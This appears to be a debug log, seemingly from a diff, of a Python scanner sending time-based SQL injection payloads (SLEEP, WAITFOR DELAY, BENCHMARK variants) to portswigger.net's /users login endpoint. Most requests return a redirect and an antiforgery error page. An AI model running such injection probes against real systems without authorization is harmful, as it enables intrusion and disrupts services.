+2024-08-16 21:59:31,705 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:32,268 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:32,281 - INFO - [21:59:32] Payload testing: or SLEEP(5)
+2024-08-16 21:59:32,294 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:33,862 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:34,414 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:34,430 - INFO - [21:59:34] Payload testing: or SLEEP(5)
+2024-08-16 21:59:34,445 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:36,132 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:36,732 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:36,756 - INFO - [21:59:36] Payload testing: or SLEEP(5)
+2024-08-16 21:59:36,765 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:38,489 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:39,099 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:39,121 - INFO - [21:59:39] Payload testing: or SLEEP(5)#
+2024-08-16 21:59:39,133 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:40,796 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:41,118 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:41,373 - INFO - [21:59:41] Payload testing: or SLEEP(5)#
+2024-08-16 21:59:41,384 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:43,082 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:43,688 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:43,709 - INFO - [21:59:43] Payload testing: or SLEEP(5)#
+2024-08-16 21:59:43,719 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:45,403 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:46,030 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:46,047 - INFO - [21:59:46] Payload testing: or SLEEP(5)--
+2024-08-16 21:59:46,055 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:47,719 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:48,082 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:48,342 - INFO - [21:59:48] Payload testing: or SLEEP(5)--
+2024-08-16 21:59:48,356 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:49,956 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:50,509 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:50,525 - INFO - [21:59:50] Payload testing: or SLEEP(5)--
+2024-08-16 21:59:50,537 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:52,301 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:57,158 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:57,286 - INFO - [21:59:57] Payload testing: or SLEEP(5)="
+2024-08-16 21:59:57,297 - INFO - [!] Recheck payload: or SLEEP(10)="
+2024-08-16 21:59:57,300 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:00:07,964 - INFO - Error making request: HTTPSConnectionPool(host='portswigger.net', port=443): Read timed out. (read timeout=10)
+2024-08-16 22:00:07,969 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:00:10,320 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:00:10,939 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:00:10,947 - INFO - [22:00:10] Payload testing: or SLEEP(5)="
+2024-08-16 22:00:10,959 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:00:12,739 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:00:13,328 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:00:13,341 - INFO - [22:00:13] Payload testing: or SLEEP(5)="
+2024-08-16 22:00:13,349 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:00:15,312 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:00:15,964 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:00:15,985 - INFO - [22:00:15] Payload testing: or SLEEP(5)='
+2024-08-16 22:00:16,000 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:00:18,041 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:00:18,730 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:00:18,742 - INFO - [22:00:18] Payload testing: or SLEEP(5)='
+2024-08-16 22:00:18,750 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:00:20,632 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:00:21,209 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:00:21,220 - INFO - [22:00:21] Payload testing: or SLEEP(5)='
+2024-08-16 22:00:21,230 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:00:22,850 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:00:23,454 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:00:23,475 - INFO - [22:00:23] Payload testing: waitfor delay '00:00:05'
+2024-08-16 22:00:23,487 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:00:25,169 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:00:25,782 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:00:25,793 - INFO - [22:00:25] Payload testing: waitfor delay '00:00:05'
+2024-08-16 22:00:25,807 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:00:27,622 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:00:28,327 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:00:28,341 - INFO - [22:00:28] Payload testing: waitfor delay '00:00:05'
+2024-08-16 22:00:28,352 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:00:32,536 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:00:33,119 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:00:33,140 - INFO - [22:00:33] Payload testing: waitfor delay '00:00:05'--
+2024-08-16 22:00:33,151 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:00:34,839 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:00:35,416 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:00:36,083 - INFO - [22:00:36] Payload testing: waitfor delay '00:00:05'--
+2024-08-16 22:00:36,096 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:00:37,965 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:00:42,521 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:00:52,546 - INFO - Error making request: HTTPSConnectionPool(host='portswigger.net', port=443): Read timed out.
+2024-08-16 22:00:52,553 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:00:54,693 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:00:55,879 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:00:55,883 - INFO - [22:00:55] Payload testing: waitfor delay '00:00:05'#
+2024-08-16 22:00:55,895 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:00:58,466 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:00:59,489 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:00:59,880 - INFO - [22:00:59] Payload testing: waitfor delay '00:00:05'#
+2024-08-16 22:00:59,894 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:01,751 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:02,329 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:01:02,338 - INFO - [22:01:02] Payload testing: waitfor delay '00:00:05'#
+2024-08-16 22:01:02,351 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:04,052 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:04,654 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:01:04,668 - INFO - [22:01:04] Payload testing: benchmark(50000000,MD5(1))
+2024-08-16 22:01:04,678 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:06,583 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:07,151 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:01:07,168 - INFO - [22:01:07] Payload testing: benchmark(50000000,MD5(1))
+2024-08-16 22:01:07,179 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:08,905 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:09,906 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:01:09,928 - INFO - [22:01:09] Payload testing: benchmark(50000000,MD5(1))
+2024-08-16 22:01:09,936 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:11,859 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:12,480 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:01:12,495 - INFO - [22:01:12] Payload testing: benchmark(50000000,MD5(1))--
+2024-08-16 22:01:12,517 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:14,112 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:14,742 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:01:14,749 - INFO - [22:01:14] Payload testing: benchmark(50000000,MD5(1))--
+2024-08-16 22:01:14,757 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:16,528 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:17,152 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:01:17,176 - INFO - [22:01:17] Payload testing: benchmark(50000000,MD5(1))--
+2024-08-16 22:01:17,186 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:18,822 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:19,385 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:01:19,403 - INFO - [22:01:19] Payload testing: benchmark(50000000,MD5(1))#
+2024-08-16 22:01:19,415 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:21,195 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:21,780 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:01:21,800 - INFO - [22:01:21] Payload testing: benchmark(50000000,MD5(1))#
+2024-08-16 22:01:21,813 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:23,833 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:24,398 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:01:24,428 - INFO - [22:01:24] Payload testing: benchmark(50000000,MD5(1))#
+2024-08-16 22:01:24,441 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:26,168 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:26,790 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:01:26,819 - INFO - [22:01:26] Payload testing: or benchmark(50000000,MD5(1))
+2024-08-16 22:01:26,828 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:28,555 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:29,157 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:01:29,167 - INFO - [22:01:29] Payload testing: or benchmark(50000000,MD5(1))
+2024-08-16 22:01:29,179 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:30,877 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:31,491 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:01:31,507 - INFO - [22:01:31] Payload testing: or benchmark(50000000,MD5(1))
+2024-08-16 22:01:31,520 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:33,486 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:34,117 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:01:34,131 - INFO - [22:01:34] Payload testing: or benchmark(50000000,MD5(1))--
+2024-08-16 22:01:34,144 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:35,813 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:36,361 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:01:36,381 - INFO - [22:01:36] Payload testing: or benchmark(50000000,MD5(1))--
+2024-08-16 22:01:36,399 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:38,230 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:38,536 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:01:39,848 - INFO - [22:01:38] Payload testing: or benchmark(50000000,MD5(1))--
+2024-08-16 22:01:39,859 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:01:41,597 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:01:42,223 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:06,644 - INFO - Starting testing...
+2024-08-16 22:02:06,649 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:09,015 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:09,688 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:09,700 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:11,314 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:11,627 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:11,886 - INFO - [22:02:11] Payload testing: # from wapiti
+2024-08-16 22:02:11,893 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:14,666 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:15,315 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:15,326 - INFO - [22:02:15] Payload testing: # from wapiti
+2024-08-16 22:02:15,332 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:17,019 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:17,679 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:17,690 - INFO - [22:02:17] Payload testing: # from wapiti
+2024-08-16 22:02:17,697 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:19,470 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:20,080 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:20,093 - INFO - [22:02:20] Payload testing: sleep(5)#
+2024-08-16 22:02:20,104 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:22,227 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:22,550 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:22,852 - INFO - [22:02:22] Payload testing: sleep(5)#
+2024-08-16 22:02:22,860 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:24,759 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:25,569 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:25,669 - INFO - [22:02:25] Payload testing: sleep(5)#
+2024-08-16 22:02:25,679 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
